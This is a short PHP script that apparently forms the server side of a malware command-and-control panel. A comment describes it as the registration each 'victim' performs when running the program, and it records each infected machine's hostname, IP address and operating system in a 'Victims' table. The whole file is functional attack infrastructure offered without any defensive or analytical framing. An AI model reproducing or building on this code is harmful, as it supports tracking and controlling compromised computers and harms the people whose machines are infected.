<?php
include 'conn.php';

//registration that each victim do when he runs the program
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["operatingsystem"])) {

    $registerQuery = $mysql->prepare("insert into Victims(hostname, ipaddress, operatingsystem) value(?,?,?)");
    $registerQuery->bind_param("sss", $_POST["hostname"], $_POST["ip"], $_POST["operatingsystem"]);
    $registerQuery->execute();


}

?>